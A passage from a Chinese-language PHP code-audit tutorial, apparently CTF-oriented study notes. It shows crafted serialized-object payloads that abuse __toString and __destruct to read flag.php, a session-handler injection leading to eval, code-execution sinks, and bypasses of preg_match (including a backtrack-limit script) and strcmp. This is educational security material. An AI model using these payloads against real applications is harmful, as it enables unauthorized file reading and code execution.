class="keyword">$this</span>-&gt;file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> test();</span><br><span class="line">$a-&gt;file = <span class="string">'D:\app\phpstudy_pro\WWW\flag.php'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">O:<span class="number">4</span>:<span class="string">"test"</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">"username"</span>;s:<span class="number">0</span>:<span class="string">""</span>;s:<span class="number">8</span>:<span class="string">"password"</span>;s:<span class="number">0</span>:<span class="string">""</span>;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">32</span>:<span class="string">"D:\app\phpstudy_pro\WWW\flag.php"</span>;&#125;</span><br><span class="line"><span class="comment">//tostring方法会在输出实例的时候执行，如果实例路径是隐秘文件就可以读取了</span></span><br></pre></td></tr></table></figure>

<p>下面就可以读取了C:\Users\YZ\Desktop\plan.txt文件了<br> <strong>echo unserialize触发了__tostring函数</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">public</span> $password = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">public</span> $file = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">out</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"username: "</span>.<span class="keyword">$this</span>-&gt;username.<span class="string">"&lt;br&gt;"</span>.<span class="string">"password: "</span>.<span class="keyword">$this</span>-&gt;password ;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="string">'O:4:"test":3:&#123;s:8:"username";s:0:"";s:8:"password";s:0:"";s:4:"file";s:32:"D:\app\phpstudy_pro\WWW\flag.php";&#125;'</span>;</span><br><span class="line"><span class="keyword">echo</span> unserialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $name;</span><br><span class="line">    <span class="keyword">var</span> $wallet;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;wallet = <span class="keyword">new</span> Wallet;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">print_info</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Name: &#123;$this-&gt;name&#125;&lt;br/&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Wallet: &#123;$this-&gt;wallet&#125;"</span>;   <span class="comment">//这里触发  输出</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Wallet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $paper_money;</span><br><span class="line">    <span class="keyword">var</span> $coin;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;paper_money = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;coin = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"paper money: &#123;$this-&gt;paper_money&#125;; coin: &#123;$this-&gt;coin&#125;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"flag&#123;xxxx-xxxx-xxxx-xxxx&#125;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$name = <span class="string">"admin"</span>;</span><br><span class="line">$passwd = <span class="string">"QNKCDZO"</span>;</span><br><span class="line"></span><br><span class="line">$user = <span class="keyword">new</span> User($name);  <span class="comment">//$this-&gt;wallet = new Wallet;</span></span><br><span class="line">$user-&gt;wallet=<span class="keyword">new</span> Flag();</span><br><span class="line">$user = serialize($user);</span><br><span class="line"><span class="keyword">echo</span> $user;</span><br><span class="line"></span><br><span class="line"><span class="comment">//有反序列化的机会干嘛不抓住呢，加上FLAG()函数呀</span></span><br><span class="line"><span class="comment">//O:4:"User":2:&#123;s:4:"name";s:5:"admin";s:6:"wallet";O:6:"Wallet":2:&#123;s:11:"paper_money";i:1;s:4:"coin";i:1;&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//echo phpinfo(); </span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    我们开始构造实例，伪造user来输出flag。flag在Flag中，但没有<span class="keyword">echo</span>函数，没办法输出。只有User可以输出，所以我们先构造User实例，然后将Wallet换成Flag,这样在调用user-&gt;print_info()时会调用User&gt;Flag&gt;_tostring()函数，然后将flag输出来</span><br></pre></td></tr></table></figure>

<h2 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h2><p>protect对象序列化时会有%00,%00对应的ascii值为0不在那个范围内，找资料发现php7.1对于属性类型不敏感，改为public</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $op = <span class="string">"1"</span>;</span><br><span class="line">        $filename = <span class="string">"/tmp/tmpfile"</span>;</span><br><span class="line">        $content = <span class="string">"Hello World!"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;     <span class="number">2.</span><span class="keyword">$this</span>-&gt;op就为int2 之后 </span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();                就<span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);             <span class="number">4.</span><span class="keyword">$this</span>-&gt;output</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((string)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $res = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);         <span class="number">3.</span>包含flag.php文件  filename是可控的，赋值为flag.php</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;         </span><br><span class="line">        <span class="keyword">echo</span> $s;                             <span class="number">5.</span><span class="keyword">echo</span>结果 即flag.php的内容</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;         <span class="number">0.</span>调用__destruct析构方法</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)   <span class="number">1.</span>用int2使之不相等  <span class="keyword">$this</span>-&gt;op就为int2</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">'str'</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[<span class="string">'str'</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $op=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">"flag.php"</span>;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line"><span class="comment">//后面的函数必须删掉了 要不然会影响类对象的赋值</span></span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> FileHandler();</span><br><span class="line">$b=serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line"><span class="comment">//O:11:"FileHandler":3:&#123;s:5:"*op";i:2;s:11:"*filename";s:8:"flag.php";s:10:"*content";N;&#125;</span></span><br><span class="line"><span class="comment">//echo phpinfo();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">在源码处找到flag</span><br></pre></td></tr></table></figure>



<h2 id="session-反序列化漏洞"><a href="#session-反序列化漏洞" class="headerlink" title="session 反序列化漏洞"></a>session 反序列化漏洞</h2><p>主要原因是<br> ini_set(‘session.serialize_handler’, ‘php_serialize’);<br> ini_set(‘session.serialize_handler’, ‘php’);<br> 两者处理session的方式不同</p>
<p>利用下面代码可以生成session值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;);&#x2F;&#x2F;a:1:&#123;s:6:&quot;spoock&quot;;s:3:&quot;111&quot;;&#125;</span><br><span class="line">&#x2F;&#x2F;ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);&#x2F;&#x2F;a|s:3:&quot;111&quot;</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&quot;spoock&quot;]&#x3D;$_GET[&quot;a&quot;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>我们来看看生成的session值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">spoock|s:3:&quot;111&quot;;    &#x2F;&#x2F;session键值|内容序列化</span><br><span class="line">a:1:&#123;s:6:&quot;spoock&quot;;s:3:&quot;111&quot;;&#125;a:1:&#123;s:N:session键值;内容序列化&#125;</span><br><span class="line">在ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);中把|之前认为是键值后面的视为序列化</span><br><span class="line">那么就可以利用这一漏洞执行一些恶意代码</span><br></pre></td></tr></table></figure>

<p>看下面的例子<br> 1.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&quot;spoock&quot;]&#x3D;$_GET[&quot;a&quot;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>2.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</span><br><span class="line">session_start();</span><br><span class="line">class lemon &#123;</span><br><span class="line">    var $hi;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;hi &#x3D; &#39;phpinfo();&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">         eval($this-&gt;hi);&#x2F;&#x2F;这里很危险，可以执行用户输入的参数</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>在1.PHP里面输入a参数序列化的值|O:5:”lemon”:1:{s:2:”hi”;s:10:”phpinfo();”;}<br> 则被序列化为<br> a:1:{s:6:”spoock”;s:44:”|O:5:”lemon”:1:{s:2:”hi”;s:10:”phpinfo();”;}<br> 在2.PHP里面打开<br> 就可以执行phpinfo（）了 </p>
<h1 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h1><h2 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h2><p><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727144617655.png" alt="image-20200727144617655"></p>
<p><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727144627313.png" alt="image-20200727144627313"></p>
<h2 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h2><p> <img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727144736487.png" alt="image-20200727144736487"></p>
<h2 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h2><p><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727145122156.png" alt="image-20200727145122156"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit]) </span><br><span class="line">当 pattern为<span class="string">'/xxxxx/e'</span>时，将会把replacement作为php代码执行。</span><br></pre></td></tr></table></figure>

<h2 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h2><p><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727151133855.png" alt="image-20200727151133855"></p>
<h4 id="数组绕过-返回是0-false"><a href="#数组绕过-返回是0-false" class="headerlink" title="数组绕过 返回是0 false"></a>数组绕过 返回是0 false</h4><p> <code>preg_match(pattern,array) = false</code></p>
<p><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727151333681.png" alt="image-20200727151333681"></p>
<p><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727151745546.png" alt="image-20200727151745546"></p>
<h4 id="正则匹配绕过"><a href="#正则匹配绕过" class="headerlink" title="正则匹配绕过"></a>正则匹配绕过</h4><p>如果在进行正则表达式匹配的时候，没有限制字符串的开始和结束(^ 和 $)，则可以存在绕过的问题</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ip = <span class="string">'1.1.1.1 abcd'</span>; <span class="comment">// 可以绕过</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/(\d+)\.(\d+)\.(\d+)\.(\d+)/"</span>,$ip)) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'error'</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="keyword">echo</span>(<span class="string">'key...'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="PCRE回溯次数限制-返回是0-false"><a href="#PCRE回溯次数限制-返回是0-false" class="headerlink" title="PCRE回溯次数限制  返回是0 false"></a>PCRE回溯次数限制  返回是0 false</h4><p><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727152045004.png" alt="image-20200727152045004"></p>
<p><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727152253982.png" alt="image-20200727152253982"></p>
<p>if(!is_array($greeting)) 验证提交的变量是否为数组，所以上面的方法就用不了了</p>
<p>查资料知道了（详细资料：<a href="http://www.laruence.com/2010/06/08/1579.html）" target="_blank" rel="noopener">http://www.laruence.com/2010/06/08/1579.html）</a></p>
<p>在PHP的pcre扩展中, 提供了俩个设置项</p>
<p><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/clip_image004-1573826613927.jpg" alt="img"></p>
<p>我本地的回溯上限为1000000，默认的回溯上限为100000。</p>
<p>当输入的字符串超过这个限制的时候，preg_match()这个函数就会出错，返回false</p>
<p>构造payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">"greeting"</span>:<span class="string">"Merry Christmas"</span> + <span class="string">"aaaaa"</span> * <span class="number">1000000</span>&#125;</span><br><span class="line">res = requests.post(<span class="string">'http://localhost/test.php'</span>, data=data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">print</span> res.content</span><br></pre></td></tr></table></figure>

<p>本地测试结果</p>
<p><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/clip_image005-1573826613927.png" alt="img"></p>
<p>成功绕过正则匹配函数，成功绕过拿到flag</p>
<h4 id="换行符（-不会匹配换行符）"><a href="#换行符（-不会匹配换行符）" class="headerlink" title="换行符（.不会匹配换行符）"></a>换行符（.不会匹配换行符）<img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727152915882.png" alt="image-20200727152915882"></h4><p><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727152642254.png" alt="image-20200727152642254"></p>
<h2 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h2><p> <img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727145239367.png" alt="image-20200727145239367"></p>
<p>同类函数</p>
<p><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727145417198.png" alt="image-20200727145417198"></p>
<h2 id="动态函数执行-GET-39-a-39-GET-39-b-39"><a href="#动态函数执行-GET-39-a-39-GET-39-b-39" class="headerlink" title="动态函数执行  $_GET[&#39;a&#39;]($_GET[&#39;b&#39;])"></a>动态函数执行  <code>$_GET[&#39;a&#39;]($_GET[&#39;b&#39;])</code></h2><p><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727145555349.png" alt></p>
<h2 id="strcmp-比较数组和字符串的时候，返回是0-false-两者相等"><a href="#strcmp-比较数组和字符串的时候，返回是0-false-两者相等" class="headerlink" title="strcmp  比较数组和字符串的时候，返回是0 false 两者相等"></a>strcmp  比较数组和字符串的时候，返回是0 false 两者相等</h2><p><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727145737809.png" alt="image-20200727145737809"></p>
<p>strcmp(array(), “abc”) = null</p>
<p>Strcmp利用<strong>数组绕过</strong><br>int strcmp ( string $str1 , string $str2 )<br>当输入的两个值为不是字符串时就会产生不预期的返回值:<br>输入password[]=1则返回success，成功绕过验证</p>
<p>如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。<br> 5.2 中是将两个参数先转换成string类型。<br> 5.3.3以后，当比较数组和字符串的时候，返回是0。<br> 5.5 中如果参数不是string类型，直接return了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $password=$_GET[<span class="string">'password'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strcmp(<span class="string">'xd'</span>,$password)) &#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">'NO!'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'YES!  flag&#123;aaa_nb&#125;'</span>;    传password[]=<span class="number">1223</span>zv3232vdas  后面无论打什么都能输出yes</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>存在以下情况</p>
